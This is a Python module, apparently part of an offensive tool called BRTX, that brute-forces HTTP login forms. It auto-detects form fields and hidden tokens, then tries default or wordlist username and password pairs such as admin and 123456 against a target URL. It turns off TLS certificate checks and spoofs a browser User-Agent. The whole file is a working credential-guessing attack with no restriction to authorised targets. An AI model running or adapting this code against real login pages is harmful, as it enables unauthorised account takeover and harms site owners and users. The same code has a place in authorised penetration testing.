#!/usr/bin/env python3
# modules/http_brute.py — HTTP login form brute force for BRTX

import urllib.request
import urllib.parse
import urllib.error
import ssl
import time
import re
from modules.base import BaseModule
from utils.colors import Colors, print_status, print_section

DEFAULT_USERLIST = ["admin", "administrator", "root", "user", "test", "guest", "manager"]
DEFAULT_PASSLIST = ["admin", "password", "123456", "admin123", "root", "pass", "test", "1234", "qwerty", "letmein"]

FAIL_INDICATORS = [
    "invalid", "incorrect", "wrong", "failed", "error",
    "invalid credentials", "login failed", "authentication failed",
    "bad username", "bad password", "denied",
]

SUCCESS_INDICATORS = [
    "dashboard", "logout", "welcome", "profile",
    "my account", "sign out", "logged in",
]


class HTTPBrute(BaseModule):

    NAME        = "brute/http"
    DESCRIPTION = "HTTP login form brute force — auto-detects fields, supports custom success/fail patterns"
    PROTOCOL    = "HTTP/S"
    REFERENCES  = [
        "https://owasp.org/www-community/attacks/Brute_force_attack",
    ]

    def _define_options(self):
        self._add_option("TARGET",       "",      True,  "Login URL (e.g. https://site.com/login)")
        self._add_option("USER_FIELD",   "username", False, "Username field name")
        self._add_option("PASS_FIELD",   "password", False, "Password field name")
        self._add_option("USERLIST",     "",      False, "Path to username wordlist (default: built-in)")
        self._add_option("PASSLIST",     "",      False, "Path to password wordlist (default: built-in)")
        self._add_option("USERNAME",     "",      False, "Single username to test")
        self._add_option("SUCCESS",      "",      False, "Custom success indicator string")
        self._add_option("FAIL",         "",      False, "Custom failure indicator string")
        self._add_option("THREADS",      "5",     False, "Concurrent requests (default: 5)")
        self._add_option("DELAY",        "0.5",   False, "Delay between attempts in seconds")
        self._add_option("TIMEOUT",      "10",    False, "Request timeout in seconds")
        self._add_option("EXTRA_DATA",   "",      False, "Extra POST fields as key=val,key2=val2")

    def run(self) -> list:
        if not self._validate():
            return []

        target     = self.get_option("TARGET").strip()
        user_field = self.get_option("USER_FIELD")
        pass_field = self.get_option("PASS_FIELD")
        delay      = float(self.get_option("DELAY") or 0.5)
        timeout    = int(self.get_option("TIMEOUT") or 10)
        extra_raw  = self.get_option("EXTRA_DATA") or ""

        # Build extra fields dict
        extra_fields = {}
        if extra_raw:
            for pair in extra_raw.split(","):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    extra_fields[k.strip()] = v.strip()

        # Auto-detect form fields if not set
        user_field, pass_field, extra_fields = self._detect_form(
            target, user_field, pass_field, extra_fields, timeout
        )

        # Load wordlists
        usernames = self._load_wordlist(self.get_option("USERLIST"), DEFAULT_USERLIST)
        passwords = self._load_wordlist(self.get_option("PASSLIST"), DEFAULT_PASSLIST)

        # Single username override
        single_user = self.get_option("USERNAME")
        if single_user:
            usernames = [single_user]

        # Custom indicators
        custom_success = self.get_option("SUCCESS") or ""
        custom_fail    = self.get_option("FAIL") or ""

        print_section(f"HTTP Brute Force — {target}")
        print_status(f"User field : {Colors.WHITE}{user_field}{Colors.RESET}", "info")
        print_status(f"Pass field : {Colors.WHITE}{pass_field}{Colors.RESET}", "info")
        print_status(f"Usernames  : {Colors.WHITE}{len(usernames)}{Colors.RESET}", "info")
        print_status(f"Passwords  : {Colors.WHITE}{len(passwords)}{Colors.RESET}", "info")
        print_status(f"Total tries: {Colors.WHITE}{len(usernames) * len(passwords)}{Colors.RESET}", "info")
        print()

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE

        findings = []
        total    = len(usernames) * len(passwords)
        count    = 0

        for username in usernames:
            for password in passwords:
                count += 1
                post_data = {
                    user_field: username,
                    pass_field: password,
                    **extra_fields,
                }

                code, body = self._post(target, post_data, timeout, ctx)
                body_lower = body.lower()

                if delay > 0:
                    time.sleep(delay)

                # Determine result
                success = False
                if custom_success and custom_success.lower() in body_lower:
                    success = True
                elif custom_fail and custom_fail.lower() not in body_lower:
                    success = True
                elif not custom_success and not custom_fail:
                    has_fail = any(ind in body_lower for ind in FAIL_INDICATORS)
                    has_ok   = any(ind in body_lower for ind in SUCCESS_INDICATORS)
                    if has_ok and not has_fail:
                        success = True
                    elif code in (301, 302) and not has_fail:
                        success = True

                status_char = f"{Colors.GREEN}HIT{Colors.RESET}" if success else f"{Colors.DARK_GRAY}---{Colors.RESET}"
                print(f"  [{count:>5}/{total}] {Colors.CYAN}{username:<20}{Colors.RESET}"
                      f"{Colors.WHITE}{password:<20}{Colors.RESET} [{code}] {status_char}")

                if success:
                    cred = self._credential(target, username, password, extra={"http_code": code})
                    findings.append(cred)
                    print(f"\n  {Colors.BOLD}{Colors.GREEN}[VALID]{Colors.RESET} "
                          f"{Colors.WHITE}{username}{Colors.RESET}:{Colors.WHITE}{password}{Colors.RESET}\n")

        print()
        if findings:
            print_status(f"Found {Colors.GREEN}{len(findings)}{Colors.RESET} valid credential(s).", "ok")
        else:
            print_status("No valid credentials found.", "warn")

        return findings

    # ── Helpers ───────────────────────────────────────────────────

    def _post(self, url, data, timeout, ctx):
        try:
            post_data = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request(
                url, data=post_data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
                }
            )
            handler = urllib.request.HTTPSHandler(context=ctx)
            opener  = urllib.request.build_opener(handler)
            with opener.open(req, timeout=timeout) as resp:
                body = resp.read(1024 * 64).decode("utf-8", errors="replace")
                return resp.status, body
        except urllib.error.HTTPError as e:
            body = ""
            try: body = e.read(1024*32).decode("utf-8", errors="replace")
            except: pass
            return e.code, body
        except Exception:
            return 0, ""

    def _detect_form(self, url, user_field, pass_field, extra, timeout):
        """Attempt to auto-detect form field names from the login page."""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            handler = urllib.request.HTTPSHandler(context=ctx)
            opener  = urllib.request.build_opener(handler)
            with opener.open(req, timeout=timeout) as resp:
                html = resp.read(1024*64).decode("utf-8", errors="replace")

            # Find all input fields
            inputs = re.findall(r'<input[^>]+>', html, re.IGNORECASE)
            for inp in inputs:
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
                type_m = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
                if not name_m:
                    continue
                name = name_m.group(1)
                typ  = type_m.group(1).lower() if type_m else "text"
                if typ == "password" and not pass_field:
                    pass_field = name
                elif typ in ("text", "email") and not user_field:
                    user_field = name
                elif typ == "hidden":
                    extra[name] = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
                    if extra[name]:
                        extra[name] = extra[name].group(1)
        except Exception:
            pass

        return user_field or "username", pass_field or "password", extra

    def _load_wordlist(self, path: str, default: list) -> list:
        if path and __import__("os").path.isfile(path):
            try:
                with open(path) as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith("#")]
            except Exception:
                pass
        return default
